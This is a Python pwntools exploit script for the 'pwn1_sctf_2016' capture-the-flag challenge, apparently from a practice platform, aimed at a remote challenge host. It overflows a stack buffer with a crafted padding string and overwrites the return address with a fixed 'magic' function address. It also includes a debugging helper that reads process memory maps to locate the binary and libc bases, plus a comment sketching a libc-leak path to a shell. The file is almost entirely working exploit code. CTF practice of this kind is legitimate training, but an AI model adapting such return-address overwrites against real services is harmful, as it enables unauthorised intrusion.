#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'mergeheap'
    interruptPoint=0
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    success('elfbase', ELFbase)
    if interruptPoint :
        success('interruptPoint', hex(interruptPoint+ELFbase))
    success('libcBase', libcBase)
    raw_input('debug>')

magic = 0x8048f0d
# io = process('./pwn1_sctf_2016')
io = remote('node2.buuoj.cn.wetolink.com', 28847)
elf = ELF('./pwn1_sctf_2016')
padding = 'I' * 21 + 'a' 
payload = padding + p32(magic)
# payload += p32(elf.sym['_start']) + p32(elf.got[''])
# lenth of payload is limited, so can't get shell(printf get libc; fgets write /bin/sh to bss; system to get shell
# io.recv()
io.sendline(payload)

io.interactive()
io.close()

